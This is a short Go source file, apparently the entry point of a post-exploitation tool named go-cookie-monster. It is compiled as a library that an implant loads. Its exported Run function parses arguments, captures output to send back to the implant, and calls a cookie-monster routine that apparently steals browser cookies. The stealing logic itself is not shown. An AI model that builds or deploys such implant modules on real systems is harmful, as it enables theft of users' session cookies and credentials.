package main

import (
	"C"
	"go-cookie-monster/pkg/cookiemonster"
	"go-cookie-monster/pkg/parser"
	"go-cookie-monster/pkg/stdredir"
)

const (
	Success = 0
	Error   = 1
)

//export Run
func Run(data uintptr, dataLen uintptr, callback uintptr) uintptr {
	// Prepare the output buffer used to send data back to the implant
	outBuff := parser.NewOutBuffer(callback)

	// Simulate command-line argument passing
	err := parser.GetCommandLineArgs(data, dataLen)
	if err != nil {
		outBuff.SendError(err)
		outBuff.Flush()
		return Error
	}

	// Start capturing stdout and stderr
	stdredir.StartCapture(outBuff)

	main()

	// Stop capturing stdout and stderr
	stdredir.StopCapture()

	outBuff.Flush()
	return Success
}

func main() {
	cookiemonster.ModeExecute()
}
